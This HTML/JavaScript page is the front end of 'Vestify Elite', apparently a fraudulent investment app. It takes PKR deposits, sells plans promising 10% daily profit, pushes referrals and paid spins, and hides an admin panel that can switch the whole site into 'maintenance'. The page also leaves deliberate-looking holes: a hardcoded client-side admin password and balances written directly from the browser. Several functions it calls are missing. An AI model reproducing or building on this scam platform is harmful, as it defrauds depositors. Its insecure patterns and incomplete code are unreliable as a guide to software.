<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Vestify Elite | Institutional Global LLC</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --primary: #3b82f6; --bg: #090e1a; --card: #13192a; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #f1f5f9; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(19, 25, 42, 0.9); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.06); border-radius: 30px; }
        .page { display: none; animation: fadeIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .btn-primary { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); }
        #wheel { width: 300px; height: 300px; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); border-radius: 50%; }
        ::-webkit-scrollbar { width: 0; }
        #maintenance-ui { z-index: 10000; }
    </style>
</head>
<body class="min-h-screen pb-32">

    <div id="maintenance-ui" class="hidden fixed inset-0 bg-black flex flex-col items-center justify-center text-center p-10">
        <i class="fa-solid fa-gears text-6xl text-blue-500 mb-6 animate-pulse"></i>
        <h2 class="text-2xl font-black uppercase">System Maintenance</h2>
        <p class="text-xs opacity-50 mt-2">Institutional Servers are being optimized. Back soon.</p>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[6000] bg-[#090e1a] flex flex-col items-center justify-center p-10 text-center">
        <div onclick="handleLogoTap()" class="w-24 h-24 btn-primary rounded-[2.5rem] flex items-center justify-center mb-8 rotate-3 cursor-pointer active:scale-95 transition-transform">
            <i class="fa-solid fa-shield-halved text-white text-4xl"></i>
        </div>
        <h1 class="text-4xl font-black italic uppercase">Vestify <span class="text-blue-500">Elite</span></h1>
        <button onclick="login()" class="w-full max-w-xs mt-16 bg-white text-black py-5 rounded-[2rem] font-black uppercase text-xs tracking-widest shadow-2xl">Secure Sync</button>
    </section>

    <div id="admin-panel" class="hidden fixed inset-0 z-[9999] bg-[#050810] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
            <h2 class="text-xl font-black text-blue-500 italic">MASTER TERMINAL</h2>
            <button onclick="closeAdmin()" class="text-3xl text-white">&times;</button>
        </div>
        <button onclick="toggleMaintenance()" class="w-full bg-red-600 py-4 rounded-xl font-black mb-6 uppercase text-xs">Toggle Maintenance Mode</button>
        <div id="admin-requests" class="space-y-4"></div>
    </div>

    <main id="app-ui" class="hidden pt-16 px-6">
        
        <div id="p-home" class="page active-page">
            <div class="glass p-8 mb-8 bg-gradient-to-br from-slate-900 to-black">
                <p class="text-[9px] text-blue-400 font-black uppercase tracking-widest">Global Portfolio Balance</p>
                <h2 class="text-5xl font-black italic mt-1 tracking-tighter" id="v-bal">₨ 0.00</h2>
            </div>
            <h3 class="font-black text-xs uppercase opacity-40 mb-4">Market Clusters</h3>
            <div id="plans-grid" class="space-y-4 pb-10"></div>
        </div>

        <div id="p-spin" class="page text-center">
            <h2 class="text-3xl font-black italic mb-2 uppercase">Lucky Terminal</h2>
            <p class="text-[10px] text-slate-500 uppercase mb-10 tracking-widest">Win Instant Mining Bonuses</p>
            <div class="relative inline-block mb-12">
                <div class="absolute -top-6 left-1/2 -translate-x-1/2 w-10 h-12 bg-red-600 z-50 shadow-xl" style="clip-path: polygon(50% 100%, 0 0, 100% 0);"></div>
                <img id="wheel" src="IMG_20260515_012434.jpg" alt="Lucky Wheel">
            </div>
            <div class="space-y-4 max-w-xs mx-auto">
                <button id="spin-btn" onclick="executeSpin()" class="w-full btn-primary py-5 rounded-[2rem] font-black uppercase text-xs">Execute Spin</button>
                <button onclick="buySpins()" class="w-full bg-slate-800 py-4 rounded-[2rem] font-black uppercase text-[9px] border border-white/5">Buy 2 Extra Spins (₨ 20)</button>
            </div>
            <p id="spin-timer" class="mt-6 text-[10px] font-bold text-blue-400 uppercase"></p>
        </div>

        <div id="p-affiliate" class="page">
            <h2 class="text-3xl font-black italic mb-6 uppercase">Network</h2>
            <div class="glass p-6 mb-6">
                <p class="text-[10px] opacity-40 uppercase font-black mb-2">Referral Link</p>
                <input id="ref-link" readonly class="w-full p-3 rounded-xl text-[10px] font-bold mb-4">
                <button onclick="copyRef()" class="btn-primary w-full py-3 rounded-xl font-black text-xs">COPY LINK</button>
            </div>
        </div>

        <div id="p-finance" class="page">
            <h2 class="text-3xl font-black italic mb-8 uppercase">Banking</h2>
            <div class="glass p-6 space-y-4">
                <div class="flex gap-2 mb-4">
                    <button onclick="toggleFinance('dep')" class="flex-1 py-4 rounded-2xl bg-blue-600 text-[10px] font-black uppercase">Deposit</button>
                    <button onclick="toggleFinance('wd')" class="flex-1 py-4 rounded-2xl bg-red-600 text-[10px] font-black uppercase">Withdraw</button>
                </div>
                <div id="finance-dep" class="space-y-4">
                    <input id="dep-amt" type="number" placeholder="Min 200 PKR" class="w-full p-4 rounded-xl bg-slate-900">
                    <input id="dep-tid" type="text" placeholder="TID Number" class="w-full p-4 rounded-xl bg-slate-900">
                    <button onclick="submitDeposit()" class="w-full btn-primary py-4 rounded-xl font-black uppercase text-xs">Submit Deposit</button>
                </div>
                <div id="history-log" class="space-y-3 pt-6 border-t border-white/5"></div>
            </div>
        </div>

        <div id="p-legal" class="page">
            <h2 class="text-3xl font-black italic mb-8 uppercase">Support</h2>
            <a href="https://chat.whatsapp.com/YOUR_LINK" class="glass p-6 block text-center mb-4">
                <i class="fa-brands fa-whatsapp text-4xl text-green-500 mb-2"></i>
                <h4 class="font-black uppercase text-xs">Official WhatsApp Group</h4>
            </a>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden fixed bottom-6 left-6 right-6 h-22 glass flex justify-around items-center z-[4000]">
        <button onclick="changePage('home')" class="flex flex-col items-center p-4"><i class="fa-solid fa-vault"></i><span class="text-[8px] font-black mt-1">VAULT</span></button>
        <button onclick="changePage('spin')" class="flex flex-col items-center p-4"><i class="fa-solid fa-dharmachakra"></i><span class="text-[8px] font-black mt-1">GAMES</span></button>
        <button onclick="changePage('affiliate')" class="flex flex-col items-center p-4"><i class="fa-solid fa-users"></i><span class="text-[8px] font-black mt-1">NETWORK</span></button>
        <button onclick="changePage('finance')" class="flex flex-col items-center p-4"><i class="fa-solid fa-wallet"></i><span class="text-[8px] font-black mt-1">BANK</span></button>
        <button onclick="changePage('legal')" class="flex flex-col items-center p-4"><i class="fa-solid fa-circle-info"></i><span class="text-[8px] font-black mt-1">INFO</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", authDomain: "vestify-991f2.firebaseapp.com", projectId: "vestify-991f2", storageBucket: "vestify-991f2.firebasestorage.app", messagingSenderId: "799007097733", appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();
        const provider = new firebase.auth.GoogleAuthProvider();

        let userObj = null, spinActive = false, rot = 0, tapCount = 0, isMaint = false;

        const WIN_MAP = { 0: 100, 45: 50, 90: 10, 135: 5, 180: 2, 225: 10, 270: 2, 315: 1 };

        db.collection("settings").doc("system").onSnapshot(doc => {
            isMaint = doc.exists ? doc.data().maintenance : false;
            if(isMaint && !userObj?.isAdmin) document.getElementById('maintenance-ui').classList.remove('hidden');
            else document.getElementById('maintenance-ui').classList.add('hidden');
        });

        async function login() {
            const r = await auth.signInWithPopup(provider);
            initApp(r.user.displayName);
        }

        function initApp(name) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('ref-link').value = `https://yourdomain.com/?ref=${name.replace(/\s/g,'')}`;
            syncData(name);
            renderMarket();
            setInterval(updateSpinTimer, 1000);
        }

        function syncData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data() || { name: name, balance: 0, lastSpin: 0, eliteSpins: 0, isAdmin: false };
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
            });
        }

        function renderMarket() {
            let h = '';
            for(let i=1; i<=10; i++) {
                const price = i*500;
                h += `<div class="glass p-6 flex justify-between items-center"><div><p class="font-black text-xs uppercase italic">Cluster v.${i}</p><p class="text-[9px] text-green-400 font-bold uppercase">Profit: ₨ ${price*0.1}/day</p></div><button onclick="buyPlan(${price})" class="btn-primary px-5 py-2.5 rounded-xl text-[10px] font-black uppercase">Activate</button></div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
        }

        async function executeSpin() {
            if(spinActive) return;
            const canFree = (Date.now() - (userObj.lastSpin || 0)) >= 86400000;
            if(!canFree && (userObj.eliteSpins || 0) <= 0) return alert("Capital Needed!");
            spinActive = true;
            const keys = Object.keys(WIN_MAP);
            const weights = [1, 5, 15, 20, 25, 15, 10, 9];
            const stopDeg = parseInt(keys[weightedRandom(weights)]);
            rot += (3600 + stopDeg - (rot % 360));
            document.getElementById('wheel').style.transform = `rotate(${rot}deg)`;
            setTimeout(async () => {
                spinActive = false;
                const winAmt = WIN_MAP[stopDeg];
                const update = { balance: userObj.balance + winAmt };
                if(canFree) update.lastSpin = Date.now();
                else update.eliteSpins = userObj.eliteSpins - 1;
                await db.collection("users").doc(userObj.name).update(update);
                alert(`Gain: ₨ ${winAmt}`);
            }, 4000);
        }

        function weightedRandom(w) { let sum=w.reduce((a,b)=>a+b,0), r=Math.random()*sum; for(let i=0;i<w.length;i++){ if(r<w[i])return i; r-=w[i]; } }
        function handleLogoTap() { tapCount++; if(tapCount>=5){ const p=prompt("Admin Key:"); if(p==="net204") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } tapCount=0; } }
        async function toggleMaintenance() { await db.collection("settings").doc("system").set({ maintenance: !isMaint }); alert("Status Changed."); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function toggleFinance(s) { document.getElementById('finance-dep').classList.toggle('hidden', s!=='dep'); }
    </script>
</body>
</html>
